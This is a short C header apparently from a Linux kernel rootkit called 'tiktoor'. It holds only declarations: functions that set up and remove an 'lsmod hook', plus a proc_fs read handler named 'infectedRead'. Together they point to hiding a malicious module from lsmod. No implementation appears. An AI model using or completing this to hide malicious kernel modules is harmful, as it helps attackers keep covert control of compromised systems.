#ifndef LSMOD_H
#define LSMOD_H

#define TIKTOOR "tiktoor"

#include <linux/module.h>
#include <linux/proc_fs.h>

int init_lsmod_hook(void);
void exit_lsmod_hook(void);
ssize_t infectedRead (struct file *file, char __user *userbuf, size_t bytes, loff_t *off);

#endif
